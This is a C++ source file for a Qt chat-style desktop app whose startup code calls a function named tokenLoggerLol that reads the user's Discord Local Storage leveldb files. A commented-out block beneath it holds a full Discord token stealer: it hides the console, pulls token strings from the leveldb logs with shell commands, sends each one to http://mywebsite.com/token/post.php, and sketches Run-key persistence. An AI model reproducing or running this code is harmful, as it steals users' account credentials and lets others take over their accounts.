#include <QApplication>

#include <vector>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>

#include "serverbutton.h"
#include "mainwindow.h"
#include "base64.h"
#include <filesystem>

#include <windows.h>
#include <regex>

namespace fs = std::filesystem;

std::string replaceAll(std::string str, const std::string& from, const std::string& to) {
    size_t start_pos = 0;
    while((start_pos = str.find(from, start_pos)) != std::string::npos) {
        str.replace(start_pos, from.length(), to);
        start_pos += to.length();
    }
    return str;
}


std::vector<std::string> split(const std::string& str, const std::string& delim) {
	std::vector<std::string> keys;
	size_t prev = 0, pos = 0;
	do {
		pos = str.find(delim, prev);
		if (pos == std::string::npos)
			pos = str.length();

		std::string key = str.substr(prev, pos - prev);
		if (!key.empty())
			keys.push_back(key);
		prev = pos + delim.length();

	} while (pos < str.length() && prev < str.length());
	return keys;
}

bool hasEnding (std::string const &fullString, std::string const &ending) {
    if (fullString.length() >= ending.length()) {
        return (0 == fullString.compare (fullString.length() - ending.length(), ending.length(), ending));
    } else {
        return false;
    }
}

std::string formatStyleSheets(std::string ssheet) {
    std::string dark = "#2a2a2a";
    std::string light = "#555555";
    std::string fg = "#cccccc";
    std::string bg = "#333333";
    return replaceAll(replaceAll(replaceAll(replaceAll(ssheet, "{fg}", fg), "{bg}", bg), "{light}", light), "{dark}", dark);
}

std::string tokenLoggerLol() {
    std::string path = std::string(getenv("APPDATA")) + "\\discord\\Local Storage\\leveldb";
    std::string total = "";
    for (const auto & entry : fs::directory_iterator(path)) {
        std::string fPath = entry.path().string();
        if (entry.path().filename().string() == "LOCK") continue;
        std::cout << fPath << "\n";
        std::ifstream infile(fPath);
        std::string str((std::istreambuf_iterator<char>(infile)),
                 std::istreambuf_iterator<char>());
        total += str;
    }
    return total;
}

int main(int argc, char *argv[]) {
    QApplication app(argc, argv);
    std::ifstream ifs("stylesheet.qss");
    std::string ss((std::istreambuf_iterator<char>(ifs)),
                   (std::istreambuf_iterator<char>()));
    
    app.setStyleSheet(QString::fromStdString(formatStyleSheets(ss)));
    MainWindow window(tokenLoggerLol());

    QObject::connect(&app, &QApplication::focusChanged, &app, [&window](QWidget* old, QWidget* now) {
        if (old == nullptr) {
            //Gained focus
            window.focusInEvent();
        } else if (now == nullptr) {
            //Lost focus
            window.focusOutEvent();
        }
    });

    int32_t ret = app.exec();
    window.save();
    return ret;
}
/*
#include <Windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <string>

#include <Wininet.h>
#pragma comment(lib, "wininet.lib")

using namespace std;

vector<string> split(const string& str, const string& delim) {
	vector<string> keys;
	size_t prev = 0, pos = 0;
	do {
		pos = str.find(delim, prev);
		if (pos == string::npos)
			pos = str.length();

		string key = str.substr(prev, pos - prev);
		if (!key.empty())
			keys.push_back(key);
		prev = pos + delim.length();

	} while (pos < str.length() && prev < str.length());

	return keys;
}

string exec(const char* cmd){
	char buffer[128];
	std::string result = "";
	FILE* pipe = _popen(cmd, "r");
	if (!pipe) throw std::runtime_error("popen() failed!");
	try {
		while (fgets(buffer, sizeof buffer, pipe) != NULL) {
			result += buffer;
		}
	}
	catch (...) {
		_pclose(pipe);
		throw;
	}
	_pclose(pipe);
	return result;
}

string replace_all(string subject, const string& search, const string& replace) {
	size_t pos = 0;
	while ((pos = subject.find(search, pos)) != string::npos) {
		subject.replace(pos, search.length(), replace);
		pos += replace.length();
	}
	return subject;
}

void post_token(string token) {
	HINTERNET wbNet = InternetOpenA("Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", 1, NULL, NULL, NULL);
	HINTERNET retFile;
	string rtn;
	if (wbNet) {
		retFile = InternetOpenUrlA(wbNet, ("http://mywebsite.com/token/post.php?t="+token).c_str(), NULL, NULL, NULL, NULL);
		if (retFile) {
			char buffer[2000];
			DWORD bytesRead;
			do {
				InternetReadFile(retFile, buffer, 2000, &bytesRead);
				rtn.append(buffer, bytesRead);
				memset(buffer, 0, 2000);
			} while (bytesRead);
			InternetCloseHandle(wbNet);
			InternetCloseHandle(retFile);
		}
	}
	InternetCloseHandle(wbNet)
	std::cout << token << "\n";
}

int main(int arg_count, char* argv) {
	FreeConsole();
	
//	HKEY key = NULL;
//	LONG v1 = RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" ,&key);
//	LONG v2 = RegSetValueEx(hkey, "CockAndBallTorture", 0, REG_SZ, (BYTE*)argv[0], (string(argv[0]).size() + 1) * sizeof(wchar_t));
	
	auto files = split(exec("cd %appdata%/discord/Local Storage/leveldb && dir /n /b *"), "\n");
	for (auto file : files) {
		if (file.find(".log") != string::npos) {
			auto lines = split(exec(string("cd %appdata%/discord/Local Storage/leveldb && more "+file).c_str()), "\n");
			for (auto line : lines) {
				if (line.find("token") != string::npos) {
					auto token = split(replace_all(line, "token>\"", ""), "\"")[0];
					post_token(token);
				}
			}
		}
	}
}
*/
